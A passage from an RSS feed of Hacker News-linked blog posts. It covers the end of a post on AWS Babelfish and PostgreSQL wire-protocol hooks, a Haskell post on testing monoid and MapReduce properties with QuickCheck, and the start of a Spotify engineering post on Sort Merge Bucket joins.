<p>Only very recently (Feb 10th, 11th) some initial, very interesting, discussion around this proposal has started (including a very interesting offer to <a href="https://www.postgresql.org/message-id/CADUqk8UndFi7WHVNZscs4ZCk37_2aBUw-K32QA7sQd_3cJ%2Bqng%40mail.gmail.com">open source MySQL protocol compatibility for Postgres!</a>). It‚Äôs understandable, it‚Äôs a very busy time for PostgreSQL hackers (the last Commitfest for feature inclusion into PostgreSQL 14 is ongoing). But Babelfish was already announced more than two months ago; and it could be published anytime. I believe we need to start a deeper conversation about Postgres-Babelfish integration sooner than later. And what is being discussed so far are mainly technical considerations around the integration of one of the possibly several integration points that may be required. <strong>I‚Äôd love to also have a strategic discussion, where the Community would address, from a leadership perspective, what would be the plans for integrating, or not, Babelfish</strong>. <strong>Is Babelfish the Elephant in the Room?</strong> Probably not anymore, but I anyway hope this post will help, at the very least, to spark the strategic discussion.</p>
<p>What is the alternative? What will happen if PostgreSQL would not implement such hooks or will not pursue understanding with AWS, for the common benefit, and help Babelfish and PostgreSQL cooperate and allow for code bases integration?</p>
<p><strong>Under this scenario, AWS will probably have to keep Babelfish as a fork</strong>. For one, AWS already keeps Aurora as a fork, even though it‚Äôs an internal one. Given AWS‚Äô well-known customer obsession and that AWS doesn‚Äôt kill services that they started offering, I think that if given no other chance they will keep Babelfish as a separate fork, getting its own share of features and contributors. Surely AWS knows that maintaining a fork is expensive. And I believe they have no intention to have it as a fork (otherwise, they won‚Äôt be publishing it as open source). So there will be serious intentions and efforts to merge it into PostgreSQL, for the benefit of all. But the recent Elastic case has demonstrated that AWS is committed to the open source software that is part of their managed services, and are willing to step up with a lot of resources when they are required to continue serving their customers. Apparently AWS has around 200 open job positions (!!) for developers working on Elasticsearch. Surely they can do the same for Babelfish, especially given that RDS Postgres/Aurora/Babelfish is probably a much larger business for them than Elastic.</p>
<h2 id="on-protocol-hooks">On protocol hooks</h2>
<p>Jan also argued that ‚Äú<em>Creating the necessary infrastructure in the postmaster and backend will open up more possibilities, that are not tied to our compatibility efforts. Possible use cases for wire protocol extensibility include the development of a completely new, not backwards compatible PostgreSQL protocol or extending the existing wire protocol</em>‚Äù. I cannot agree more. This effort not only benefits the Babelfish integration; but also opens the door for new PostgreSQL protocols.</p>
<p>The current PostgreSQL protocol (v3) <a href="https://www.postgresql.org/docs/7.4/release-7-4.html">has been in use since PostgreSQL 7.4</a>, released in 2003. It works well, and has spun the broadest possible set of drivers, tools and even compatible databases that use it (like CockroachDB, Crate.io or NoisePage, for example). But it also has some limitations and well-known problems. There is an entry in PostgreSQL ‚ÄúTODO‚Äù about <a href="https://wiki.postgresql.org/wiki/Todo#Wire_Protocol_Changes_.2F_v4_Protocol">proposed changes for an eventual v4 version of the protocol</a>. I also participated in another <a href="https://github.com/pgjdbc/pgjdbc/blob/95ba7b261e39754674c5817695ae5ebf9a341fae/backend_protocol_v4_wanted_features.md">‚Äúbrain dump‚Äù on v4 proposed features</a>. But despite much talk, v4 has not happened and there‚Äôs no ongoing effort to make it happen. v3 is to stay for long.</p>
<p>Why is that, why can‚Äôt the protocol evolve? Have a look at <a href="https://www.postgresql.org/message-id/CD5C1525-8B2C-4986-87F0-B1CB3B52ACA7%40wa-research.ch">this thread</a>, where a proposal to implement an HTTP protocol for PostgreSQL was made. Other than the proposal about HTTP itself ‚Äìwhich has its own merits, and is a topic that I believe should definitely be discussed again‚Äì, the general sentiment was that <strong>any new protocol would have to provide all the features that the current protocol has, work for every use case, do not disrupt existing drivers or provide good means for driver rewrites; and do it significantly better than the current one</strong>.</p>
<h2 id="the-innovators-dilemma">The Innovator‚Äôs Dilemma</h2>
<p>I don‚Äôt have an MBA, but this to me is a clear case of <a href="https://en.wikipedia.org/wiki/The_Innovator%27s_Dilemma">The Innovator‚Äôs Dilemma</a>. PostgreSQL protocol v3 is the incumbent, and protocol v4 and/or other protocols like HTTP are the potential disruptive innovators. In what looks like a perfect match for Christensen‚Äôs book, a disruptive protocol innovation ‚Äú<em>would not initially satisfy the demands of even the high end of the market</em>‚Äù. In other words, initial versions of these protocols should not target feature parity with the incumbent. They should rather focus on doing the basics, but much better, with a compelling higher value proposition.</p>
<p>Eventually, these protocols ‚Äú<em>will surpass sustaining technologies</em>‚Äù and may end up replacing the current v3 protocol. This was very well explained by Prof. Clayton and is represented on his famous graph comparing the product ‚Ä¶</p></div></div></div></div></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://postgresql.fund/blog/babelfish-the-elephant-in-the-room/">https://postgresql.fund/blog/babelfish-the-elephant-in-the-room/</a></em></p>]]>
            </description>
            <link>https://postgresql.fund/blog/babelfish-the-elephant-in-the-room/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26114281</guid>
            <pubDate>Fri, 12 Feb 2021 14:58:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Fuzz me wrong ‚Äì How QuickCheck destroyed my favourite theory]]>
            </title>
            <description>
<![CDATA[
Score 124 | Comments 56 (<a href="https://news.ycombinator.com/item?id=26112441">thread link</a>) | @lrngjcb
<br/>
February 12, 2021 | https://thma.github.io/posts/2021-01-30-How-QuickCheck-destroyed-my-favourite-theory.html | <a href="https://web.archive.org/web/*/https://thma.github.io/posts/2021-01-30-How-QuickCheck-destroyed-my-favourite-theory.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div role="main">
    
    <div>
    <p><em>Posted on January 30, 2021
    
        by Thomas Mahler
    </em></p></div>

<h2 id="introduction">Introduction</h2>
<p>Quite a while back I wrote a larger article on the algebraic foundation of software patterns which also covered the <a href="https://thma.github.io/posts/2018-11-24-lambda-the-ultimate-pattern-factory.html#map-reduce">MapReduce algorithm</a>.</p>
<p>During the research digged out a paper on <a href="https://pdfs.semanticscholar.org/0498/3a1c0d6343e21129aaffca2a1b3eec419523.pdf">algebraic properties of distributed big data analytics</a>, which explained that a MapReduce will always work correctly when the intermediate data structure resulting from the <code>map</code>-phase is a Monoid under the <code>reduce</code>-operation.</p>
<p>For some reason, I was not convinced that this Monoid-condition was enough, because all the typical examples like word-frequency maps are even <strong>commutative</strong> Monoids under the respective reduce operation.</p>
<p>So I came up with the following personal theory:</p>
<blockquote>
<p>Only if the intermediate data structure resulting from the <code>map</code>-phase is a <strong>commutative Monoid</strong> under the <code>reduce</code>-operation, then a parallel MapReduce will produce correct results.</p>
</blockquote>
<p>I tried to validate this property using the <a href="https://wiki.haskell.org/Introduction_to_QuickCheck2">QuickCheck test framework</a>.</p>
<p>Interestingly the QuickCheck tests failed! This finally convinced me that my theory was wrong, and after a little deeper thought, I could understand why.</p>
<p>I was impressed with the power of QuickCheck, so I thought it would be a good idea to share this lesson in falsification.</p>
<p>The code shown in this blog <a href="https://github.com/thma/CommutativeMonoid">is also available on GitHub</a></p>
<h2 id="commutative-monoids">Commutative Monoids</h2>
<p>In abstract algebra, a monoid is a <em>set</em> equipped with an <em>associative binary operation</em> and an <em>identity element</em>.</p>
<p>The simplest example for a <em>commutative Monoid</em> is <span>\((\mathbb{N}_0, +, 0)\)</span>: the natural numbers under addition with <span>\(0\)</span> as the identity (or neutral) element. We can use QuickCheck to verify that indeed the Monoid laws plus commutativity are maintained.</p>
<p>If we want to use <code>GHC.Natural</code> type to represent natural numbers, we first have to make <code>Natural</code> instantiate the <code>Arbitrary</code> type class which is used by QuickCheck to automatically generate test data:</p>
<div id="cb1"><pre><code><span id="cb1-1"><span>import</span>           <span>Test.QuickCheck</span> (<span>Arbitrary</span>, arbitrary, <span>NonNegative</span> (..))</span>
<span id="cb1-2"><span>import</span>           <span>GHC.Natural</span>     (<span>Natural</span>, naturalFromInteger)</span>
<span id="cb1-3"></span>
<span id="cb1-4"><span>instance</span> <span>Arbitrary</span> <span>Natural</span> <span>where</span></span>
<span id="cb1-5">  arbitrary <span>=</span> <span>do</span></span>
<span id="cb1-6">    <span>NonNegative</span> nonNegative <span>&lt;-</span> arbitrary</span>
<span id="cb1-7">    <span>return</span> <span>$</span> naturalFromInteger nonNegative</span></code></pre></div>
<p>Now we can start to write our property based tests. For algebraic structures it is straightforward to come up with properties: we just write the required laws (associativity, 0 is identity element and commutativity) as properties.</p>
<p>I am using Hspec as a wrapper around QuickCheck as it provides a very nice testing DSL which makes it easy to read the code and the output of the test suite:</p>
<div id="cb2"><pre><code><span id="cb2-1"><span>import</span>           <span>Test.Hspec</span></span>
<span id="cb2-2"></span>
<span id="cb2-3"><span>spec ::</span> <span>Spec</span></span>
<span id="cb2-4">spec <span>=</span> <span>do</span></span>
<span id="cb2-5">  describe <span>"The Monoid 'Natural Numbers under Addition'"</span> <span>$</span> <span>do</span></span>
<span id="cb2-6">    it <span>"is associative"</span> <span>$</span></span>
<span id="cb2-7">      property <span>$</span> \x y z <span>-&gt;</span> ((x <span>+</span> y) <span>+</span> z) <span>`shouldBe`</span> ((x <span>+</span> (y <span>+</span> z))<span> ::</span> <span>Natural</span>)</span>
<span id="cb2-8">      </span>
<span id="cb2-9">    it <span>"has 0 as left and right identity element"</span> <span>$</span></span>
<span id="cb2-10">      property <span>$</span> \x <span>-&gt;</span> (x <span>+</span> <span>0</span> <span>`shouldBe`</span> (<span>x ::</span> <span>Natural</span>)) <span>.&amp;&amp;.</span> (<span>0</span> <span>+</span> x <span>`shouldBe`</span> x)</span>
<span id="cb2-11">      </span>
<span id="cb2-12">    it <span>"is commutative"</span> <span>$</span></span>
<span id="cb2-13">      property <span>$</span> \x y <span>-&gt;</span> x <span>+</span> y <span>`shouldBe`</span> (y <span>+</span><span> x ::</span> <span>Natural</span>)</span></code></pre></div>
<p>The output of these tests will be as follows:</p>
<div id="cb3"><pre><code><span id="cb3-1"><span>Monoid</span></span>
<span id="cb3-2">  <span>The</span> Monoid <span>'Natural Numbers under Addition'</span></span>
<span id="cb3-3">    <span>is</span> associative</span>
<span id="cb3-4">      <span>+++</span> OK, passed 100 tests.</span>
<span id="cb3-5">    <span>has</span> 0 as identity (or neutral) <span>element</span></span>
<span id="cb3-6">      <span>+++</span> OK, passed 100 tests.</span>
<span id="cb3-7">    <span>is</span> commutative</span>
<span id="cb3-8">      <span>+++</span> OK, passed 100 tests.</span></code></pre></div>
<p>So behind the scenes, QuickCheck has generated test data for 100 tests for each property under test. For all these data the test cases passed.</p>
<p>This is definitely not a proof. But it gives us some confidence that our math text-books are correct when giving Natural Numbers under addition as an example for a commutative Monoid.</p>
<p>OK, that was easy! Now let‚Äôs move to non-commutative Monoids.</p>
<h2 id="non-commutative-monoids">Non-commutative Monoids</h2>
<p>Strings (or any other Lists) under concatenation are a typical example. It‚Äôs easy to see that <code>"hello" ++ ("dear" ++ "people")</code> equals <code>"(hello" ++ "dear") ++ "people"</code>, but that <code>"hello" ++ "world"</code> differs from <code>"world" ++ "hello"</code>.</p>
<p>Now let‚Äôs try to formalize these intuitions as QuickCheck property based tests again.</p>
<p>First I‚Äôm introducing an alias for <code>(++)</code>, as it is defined on any list type, it would be required to have type signatures in all properties (as we had all those <code>:: Natural</code> signatures in the examples above). So I define an operation <code>(‚äï)</code> which is only defined on <code>String</code> instances:</p>
<div id="cb4"><pre><code><span id="cb4-1">(‚äï)<span> ::</span> <span>String</span> <span>-&gt;</span> <span>String</span> <span>-&gt;</span> <span>String</span></span>
<span id="cb4-2">(‚äï) a b <span>=</span> a <span>++</span> b</span></code></pre></div>
<p>Now we can extend our test suite with the following test cases:</p>
<div id="cb5"><pre><code><span id="cb5-1">  describe <span>"The Monoid 'Strings under concatenation'"</span> <span>$</span> <span>do</span></span>
<span id="cb5-2">    </span>
<span id="cb5-3">    it <span>"is associative"</span> <span>$</span> </span>
<span id="cb5-4">      property <span>$</span> \x y z <span>-&gt;</span> ((x ‚äï y) ‚äï z) <span>`shouldBe`</span> (x ‚äï (y ‚äï z))</span>
<span id="cb5-5">      </span>
<span id="cb5-6">    it <span>"has \"\" as left and right identity element"</span> <span>$</span></span>
<span id="cb5-7">      property <span>$</span> \x <span>-&gt;</span> (x ‚äï <span>""</span> <span>`shouldBe`</span> x) <span>.&amp;&amp;.</span> (<span>""</span> ‚äï x <span>`shouldBe`</span> x)</span></code></pre></div>
<p>The output looks promising:</p>
<div id="cb6"><pre><code><span id="cb6-1">  <span>The</span> Monoid <span>'Strings under concatenation'</span></span>
<span id="cb6-2">    <span>is</span> associative</span>
<span id="cb6-3">      <span>+++</span> OK, passed 100 tests.</span>
<span id="cb6-4">    <span>has</span> <span>""</span> as left and right identity element</span>
<span id="cb6-5">      <span>+++</span> OK, passed 100 tests.</span></code></pre></div>
<p>Now let‚Äôs try to test the non-commutativity:</p>
<div id="cb7"><pre><code><span id="cb7-1">    it <span>"is NOT commutative"</span> <span>$</span></span>
<span id="cb7-2">      property <span>$</span> \x y <span>-&gt;</span> x ‚äï y <span>`shouldNotBe`</span> y ‚äï x</span></code></pre></div>
<p>But unfortunately the output tells us that this is not true:</p>
<div id="cb8"><pre><code><span id="cb8-1">    <span>is</span> NOT commutative FAILED [1]</span>
<span id="cb8-2"></span>
<span id="cb8-3">  <span>1</span>) <span>Monoid</span>, The Monoid <span>'Strings under concatenation'</span>, is NOT commutative</span>
<span id="cb8-4">       <span>Falsifiable</span> (after 1 test)<span>:</span></span>
<span id="cb8-5">         <span>""</span></span>
<span id="cb8-6">         <span>""</span></span>
<span id="cb8-7">       <span>not</span> expected: <span>""</span></span></code></pre></div>
<p>We formulated the property in the wrong way. The <code>(‚äï)</code> <em>may be commutative for some</em> edge cases, e.g.&nbsp;when one or both of the arguments are <code>""</code>. But it is not commutative <em>in general</em> ‚Äì that is for all possible arguments.</p>
<p>We could rephrase this property as <em>‚ÄúThere exists at least one pair of arguments <span>\((x, y)\)</span> for which <span>\(\oplus\)</span> is not commutative‚Äù</em>:</p>
<p><span>\[\exists (x,y) \left [  x \oplus y \neq y \oplus x \right ]\]</span></p>
<p>QuickCheck does not come with a mechanism for <em>existential quantification</em>. But as is has <code>forAll</code>, that is <em>universal quantification</em>. So we can try to make use of the following equivalence:</p>
<p><span>\[\exists (x,y) \left [  x \oplus y \neq y \oplus x \right ] 
  \equiv 
  \neg \forall (x,y) \left [ x \oplus y = y \oplus x \right ]\]</span></p>
<p>Unfortunately we can not write this simply as <code>not forAll</code>, as <code>forAll</code> returns a <code>Property</code> but <code>not</code> expects a <code>Bool</code>. But as explained in <a href="https://stackoverflow.com/questions/42764847/is-there-a-there-exists-quantifier-in-quickcheck">this discussion on Stackoverflow</a> it is still posible to implement our own <code>exists</code>:</p>
<div id="cb9"><pre><code><span id="cb9-1"><span>exists ::</span> (<span>Show</span> a, <span>Arbitrary</span> a) <span>=&gt;</span> (a <span>-&gt;</span> <span>Bool</span>) <span>-&gt;</span> <span>Property</span></span>
<span id="cb9-2">exists <span>=</span> forSome <span>$</span> resize <span>1000</span> arbitrary</span>
<span id="cb9-3"></span>
<span id="cb9-4"><span>forSome ::</span> (<span>Show</span> a, <span>Testable</span> prop) <span>=&gt;</span> <span>Gen</span> a <span>-&gt;</span> (a <span>-&gt;</span> prop) <span>-&gt;</span> <span>Property</span></span>
<span id="cb9-5">forSome gen prop <span>=</span></span>
<span id="cb9-6">  mapResult (\r <span>-&gt;</span> r {P.reason <span>=</span> <span>"No witness found."</span>, P.callbacks <span>=</span> []}) <span>$</span></span>
<span id="cb9-7">    once <span>$</span> disjoin <span>$</span> <span>replicate</span> <span>1000</span> <span>$</span> forAll gen prop</span></code></pre></div>
<p>Now we can rewrite the property <span>\(\exists (x,y) \left [ x \oplus y \neq y \oplus x \right ]\)</span> as follows:</p>
<div id="cb10"><pre><code><span id="cb10-1">    it <span>"is not commutative (via exists)"</span> <span>$</span></span>
<span id="cb10-2">      exists <span>$</span> \(x,y) <span>-&gt;</span> x ‚äï y <span>/=</span> y ‚äï x</span></code></pre></div>
<p>I like how close the Haskell code stays to the concise mathematical formulation! The output of this test fits much better into our intuitive understanding:</p>
<div id="cb11"><pre><code><span id="cb11-1">    <span>is</span> not commutative (via exists)</span>
<span id="cb11-2">      <span>+++</span> OK, passed 1 test.</span></code></pre></div>
<h2 id="sequential-mapreduce">Sequential MapReduce</h2>
<blockquote>
<p>MapReduce is a programming model and an associated implementation for processing and generating large data sets. Users specify <strong>a map function</strong> that processes a key/value pair to generate a set of intermediate key/value pairs, <strong>and a reduce function</strong> that merges all intermediate values associated with the same intermediate key.</p>
<p>[This] abstraction is inspired by the map and reduce primitives present in Lisp and many other functional languages. <a href="https://storage.googleapis.com/pub-tools-public-publication-data/pdf/16cb30b4b92fd4989b8619a61752a2387c6dd474.pdf">Quoted from Google Research</a></p>
</blockquote>
<p>I‚Äôm not going into more details here, as You‚Äôll find detailed information on this approach and a working example <a href="https://thma.github.io/posts/2018-11-24-lambda-the-ultimate-pattern-factory.html#map-reduce">in my original article</a>.</p>
<p>Here is the definition of a sequential MapReduce:</p>
<div id="cb12"><pre><code><span id="cb12-1">simpleMapReduce </span>
<span id="cb12-2"><span>  ::</span> (a <span>-&gt;</span> b)   <span>-- map function</span></span>
<span id="cb12-3">  <span>-&gt;</span> ([b] <span>-&gt;</span> c) <span>-- reduce function</span></span>
<span id="cb12-4">  <span>-&gt;</span> [a]        <span>-- list to map over</span></span>
<span id="cb12-5">  <span>-&gt;</span> c          <span>-- result</span></span>
<span id="cb12-6">simpleMapReduce mapFunc reduceFunc <span>=</span> reduceFunc <span>.</span> <span>map</span> mapFunc</span></code></pre></div>
<p>We can test the sequential MapReduce algorithm with the following property based test:</p>
<div id="cb13"><pre><code><span id="cb13-1">    it <span>"works correctly with a sequential map-reduce"</span> <span>$</span></span>
<span id="cb13-2">      property <span>$</span> \a b c d <span>-&gt;</span> (simpleMapReduce <span>reverse</span> (<span>foldr</span> (‚äï) <span>""</span>) [a,b,c,d]) </span>
<span id="cb13-3">                     <span>`shouldBe`</span> (<span>reverse</span> a) ‚äï (<span>reverse</span> b) ‚äï (<span>reverse</span> c) ‚äï (<span>reverse</span> d)</span></code></pre></div>
<h3 id="excurs-foldmap">Excurs: foldMap</h3>
<p>What I have shown so far just demonstrates the general mechanism of chaining <code>map</code> and <code>reduce</code> functions without implying any parallel execution. Essentially we are chaining a <code>map</code> with a <code>fold</code> (i.e.&nbsp;reduction) function. In the Haskell base library there is a higher order function <code>foldMap</code> that covers exactly this pattern of chaining. Please note that <code>foldMap</code>does only a single traversal of the foldable data structure. It fuses the <code>map</code> and <code>reduce</code> phase into a single one by function composition of <code>mappend</code> and the mapping function <code>f</code>:</p>
<div id="cb14"><pre><code><span id="cb14-1"><span>-- | Map each element of the structure to a monoid,</span></span>
<span id="cb14-2"><span>-- and combine the results.</span></span>
<span id="cb14-3"><span>foldMap</span><span> ::</span> (<span>Foldable</span> t, <span>Monoid</span> m) <span>=&gt;</span> (a <span>-&gt;</span> m) <span>-&gt;</span> t a <span>-&gt;</span> m</span>
<span id="cb14-4"><span>foldMap</span> f <span>=</span> <span>foldr</span> (<span>mappend</span> <span>.</span> f) <span>mempty</span></span></code></pre></div>
<h2 id="parallel-mapreduce">Parallel MapReduce</h2>
<p>Now we come to the tricky part that kicked off this whole discussion: parallelism.</p>
<p>As an example we consider a simple sequential MapReduce, taking an input list of <code>Int</code>s, computing their squares and computing the sum of these squares:</p>
<div id="cb15"><pre><code><span id="cb15-1">Œª<span>&gt;</span> simpleMapReduce (<span>^</span><span>2</span>) (<span>foldr</span> (<span>+</span>) <span>0</span>) [<span>1</span>,<span>2</span>,<span>3</span>,<span>4</span>]</span>
<span id="cb15-2"><span>30</span></span></code></pre></div>
<p>Let‚Äôs try to design this as a massively parallelized algorithm:</p>
<ol type="1">
<li><p>Mapping of <code>(^2)</code> over the input-list <code>[1,2,3,4]</code> would be started in parallel to the reduction of the intermediary list of squares by <code>(foldr (+) 0)</code>.</p></li>
<li><p>The mapping phase will be executed as a set of parallel computations (one for each element of the input list).</p></li>
<li><p>The reduction phase will also be executed as a set of parallel computations (one for each addition).</p></li>
</ol>
<p>Of course the reduction phase can begin only when at least one list element is squared. So in effect the mapping process would have to start first. The parallel computation of squares will result in a non-deterministic sequence of computations. In particular it is not guaranteed that all elements of the input list are processed in the original list order. So it might for example ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://thma.github.io/posts/2021-01-30-How-QuickCheck-destroyed-my-favourite-theory.html">https://thma.github.io/posts/2021-01-30-How-QuickCheck-destroyed-my-favourite-theory.html</a></em></p>]]>
            </description>
            <link>https://thma.github.io/posts/2021-01-30-How-QuickCheck-destroyed-my-favourite-theory.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26112441</guid>
            <pubDate>Fri, 12 Feb 2021 11:16:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Spotify Optimized the Largest Dataflow Job Ever for Wrapped 2020]]>
            </title>
            <description>
<![CDATA[
Score 195 | Comments 125 (<a href="https://news.ycombinator.com/item?id=26111993">thread link</a>) | @SirOibaf
<br/>
February 12, 2021 | https://engineering.atspotify.com/2021/02/11/how-spotify-optimized-the-largest-dataflow-job-ever-for-wrapped-2020 | <a href="https://web.archive.org/web/*/https://engineering.atspotify.com/2021/02/11/how-spotify-optimized-the-largest-dataflow-job-ever-for-wrapped-2020">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        <!-- post title -->
        

        <div>
            <p><img src="https://engineering.atspotify.com/wp-content/themes/theme-spotify/images/icon.png" alt=""></p><p><span>February 11, 2021</span>
                
            </p>
        </div>
        <!-- post details -->
        <p><a href="https://engineering.atspotify.com/2021/02/11/how-spotify-optimized-the-largest-dataflow-job-ever-for-wrapped-2020/" title="How Spotify Optimized the Largest Dataflow Job Ever for Wrapped 2020">
                        <img src="https://storage.googleapis.com/rnd-atspotify/sites/2/2021/02/image1.gif" alt="" loading="lazy" data-image-size="post-thumbnail" data-stateless-media-bucket="rnd-atspotify" data-stateless-media-name="sites/2/2021/02/image1.gif">                    </a></p>

        <!-- /post title -->

        
<p>In this post we‚Äôll discuss how Spotify optimized and sped up elements from our largest Dataflow job, <a rel="noreferrer noopener" href="https://engineering.atspotify.com/2020/02/18/spotify-unwrapped-how-we-brought-you-a-decade-of-data/" target="_blank">Wrapped 2019</a>, for <a href="https://open.spotify.com/genre/2020-page">Wrapped 2020</a> using a technique called Sort Merge Bucket (SMB) join. We‚Äôll present the design and implementation of SMB and how we incorporated it into our data pipelines.</p>



<h2>Introduction</h2>



<p>Shuffle is the core building block for many big data transforms, such as a join, GroupByKey, or other reduce operations. Unfortunately, it‚Äôs also one of the most expensive steps in many pipelines. Sort Merge Bucket is an optimization that reduces shuffle by doing work up front on the producer side. The intuition is that for datasets commonly and frequently joined on a known key, e.g., user events with user metadata on a user ID, we can write them in bucket files with records bucketed and sorted by that key. By knowing which files contain a subset of keys and in what order, shuffle becomes a matter of merge-sorting values from matching bucket files, completely eliminating costly disk and network I/O of moving key‚Äìvalue pairs around. Andrea Nardelli carried out the original investigation on Sort Merge Buckets for his <a href="http://kth.diva-portal.org/smash/get/diva2:1334587/FULLTEXT01.pdf">2018 master‚Äôs thesis</a>, and we started looking into generalizing the idea as a <a rel="noreferrer noopener" href="https://spotify.github.io/scio/extras/Sort-Merge-Bucket.html" target="_blank">Scio module</a> afterwards.</p>



<h2>Design and Implementation</h2>



<p>The majority of the data pipelines at Spotify are written in <a rel="noreferrer noopener" href="https://github.com/spotify/scio" target="_blank">Scio</a>, a Scala API for <a href="https://beam.apache.org/">Apache Beam</a>, and run on the <a href="https://cloud.google.com/dataflow">Google Cloud Dataflow</a> service. We implemented SMB in Java to be closer to the native Beam SDK (and even wrote and collaborated on a <a href="https://docs.google.com/document/d/1AQlonN8t4YJrARcWzepyP7mWHTxHAd6WIECwk1s3LQQ/edit?usp=sharing">design document with the Beam community</a>), and provide Scala syntactic sugar in Scio like many other I/Os. The design is modularized into the main components listed below ‚Äî we‚Äôll start with the two top-level SMB <a href="https://beam.apache.org/documentation/programming-guide/#transforms" target="_blank" rel="noreferrer noopener">PTransforms</a> ‚Äî the write and read operations SortedBucketSink and SortedBucketSource.</p>



<h3>SortedBucketSink</h3>



<p>This transform writes a <a rel="noreferrer noopener" href="https://beam.apache.org/documentation/programming-guide/#pcollections" target="_blank">PCollection</a>&lt;T&gt; (where T has a corresponding <a href="https://github.com/spotify/scio/blob/master/scio-smb/src/main/java/org/apache/beam/sdk/extensions/smb/FileOperations.java" target="_blank" rel="noreferrer noopener">FileOperations&lt;T&gt;</a> instance) in SMB format. It first extracts keys and assigns bucket IDs using logic provided by <a href="https://github.com/spotify/scio/blob/master/scio-smb/src/main/java/org/apache/beam/sdk/extensions/smb/BucketMetadata.java" target="_blank" rel="noreferrer noopener">BucketMetadata</a>, groups key‚Äìvalues by the ID, sorts all values, and then writes them into files corresponding to bucket IDs using the FileOperations instance.</p>



<p>In addition to the bucket files, a JSON file is also written to the output directory representing the information from BucketMetadata that‚Äôs necessary to read the source: the number of buckets, the hashing scheme, and the instructions to extract the key from each record (for example, for Avro records we can encode this instruction with the name of the GenericRecord field containing the key).</p>



<figure><img loading="lazy" width="700" height="255" src="https://storage.googleapis.com/rnd-atspotify/sites/2/2021/02/image5-700x255.png" alt="" srcset="https://storage.googleapis.com/rnd-atspotify/sites/2/2021/02/image5-700x255.png 700w, https://storage.googleapis.com/rnd-atspotify/sites/2/2021/02/image5-250x91.png 250w, https://storage.googleapis.com/rnd-atspotify/sites/2/2021/02/image5-768x280.png 768w, https://storage.googleapis.com/rnd-atspotify/sites/2/2021/02/image5-120x44.png 120w, https://storage.googleapis.com/rnd-atspotify/sites/2/2021/02/image5.png 1180w" sizes="(max-width: 700px) 100vw, 700px"></figure>



<h3>SortedBucketSource</h3>



<p>This transform reads from one or more sources written in SMB format with the same key and hashing scheme. It opens file handles for corresponding buckets from each source (using FileOperations&lt;T&gt; for that input type) and merges them while maintaining sorted order. Results are emitted as <a rel="noreferrer noopener" href="https://github.com/apache/beam/blob/master/sdks/java/core/src/main/java/org/apache/beam/sdk/transforms/join/CoGbkResult.java" target="_blank">CoGbkResult</a> objects per key group, the same class Beam uses for regular Cogroup operations, so the user can extract the results per source with the correct parameterized type.</p>



<figure><img loading="lazy" width="700" height="365" src="https://storage.googleapis.com/rnd-atspotify/sites/2/2021/02/image7-700x365.png" alt="" srcset="https://storage.googleapis.com/rnd-atspotify/sites/2/2021/02/image7-700x365.png 700w, https://storage.googleapis.com/rnd-atspotify/sites/2/2021/02/image7-250x130.png 250w, https://storage.googleapis.com/rnd-atspotify/sites/2/2021/02/image7-768x400.png 768w, https://storage.googleapis.com/rnd-atspotify/sites/2/2021/02/image7-120x63.png 120w, https://storage.googleapis.com/rnd-atspotify/sites/2/2021/02/image7.png 1067w" sizes="(max-width: 700px) 100vw, 700px"></figure>



<h3>FileOperations</h3>



<p>FileOperations abstracts away the reading and writing of individual bucket files. Since we need fine-grained control over the exact elements and their order in every file, we cannot leverage the existing Beam file I/Os, which operate on a PCollection level and abstract away the locality and order of elements. Instead, SMB file operations happen at a lower level of BoundedSource for input and ParDo for output. Currently Avro, BigQuery TableRow JSON, and TensorFlow TFRecord/Example records are supported. We plan to add other formats like Parquet as well.</p>



<h3>BucketMetadata</h3>



<p>This class abstracts the keying and bucketing of elements, and includes information such as key field, class, number of buckets, shards, and hash function. The metadata is serialized as a JSON file alongside data files when writing, and used to check compatibility when reading SMB sources.</p>



<h3>Optimizations and Variants</h3>



<p>Over the last year and a half we‚Äôve been adopting SMB at Spotify for various use cases, and accumulated many improvements to handle the scale and complexity of our data pipelines.</p>



<ul><li><strong>Date partitioning:</strong> At Spotify, event data is written to Google Cloud Services (GCS) in hourly or daily partitions. A common data engineering use case is to read many partitions in a single pipeline ‚Äî for example, to compute stream count over the last seven days. For a non-SMB read, this can be easily done in a single PTransform using wildcard file patterns to match files across multiple directories. However, unlike most File I/Os in Beam, the SMB Read API requires the input to be specified as a directory, rather than a file pattern (this is because we need to check the directory‚Äôs metadata.json file as well as the actual record files). Additionally, it must match up bucket files across partitions as well as across different sources, while ensuring that the CoGbkResult output correctly groups data from all partitions of a source into the same TupleTag key. We evolved the SMB Read API to accept one or more directories <em>per source</em>.&nbsp;</li></ul>



<ul><li><strong>Sharding:</strong> Although the Murmur class of hash functions we use during bucket assignment usually ensures an even distribution of records across buckets, in some instances one or more buckets may be disproportionately large if the key space is skewed, creating possible OOM errors when grouping and sorting records. In this case, we allow users to specify a number of <em>shards</em> to further split each bucket file. During the bucket assignment step, a value between [0, numShards) is generated randomly <a href="https://beam.apache.org/documentation/runtime/model/#bundling-and-persistence"><em>per bundle</em></a>. Since this value is computed completely orthogonally to the bucket ID, it can break up large key groups across files. Since each shard is still written in sorted order, they can simply be merged together at read time.</li></ul>



<ul><li><strong>Parallelism:</strong> Since the number of buckets in an SMB sink is always a power of 2, we can come up with a joining scheme across sources with different numbers of buckets based off of a desired level of parallelism specified by the user. For example, if the user wants to join Source 1 with 4 buckets and Source 2 with 2 buckets, they can specify either:<ul><li><strong>Minimum parallelism,</strong> or ‚ÄúMerge Greatest Buckets‚Äù strategy: 2 parallel readers will be created. Each reader will read 2 buckets from source A and 1 from source B, merging them together. Because bucket IDs are assigned by taking the integer hash value of the key modulo the desired number of buckets, mathematically we know that the key spaces of the merged buckets overlap.</li><li><strong>Maximum parallelism,</strong> or ‚ÄúLeast Bucket Replication‚Äù strategy: 4 parallel readers will be created. Each reader will read 1 bucket from Source A and 1 from Source B. After merging each key group, the reader will have to rehash the key modulo the greatest number of buckets, to avoid emitting duplicate values. Therefore, even though this strategy achieves a higher level of parallelism, there is some overhead of computing duplicate values and rehashing to eliminate them.</li><li><strong>Auto parallelism:</strong> Creates a number of readers between minimal and maximal amounts, based on a desired split size value provided by the Runner at 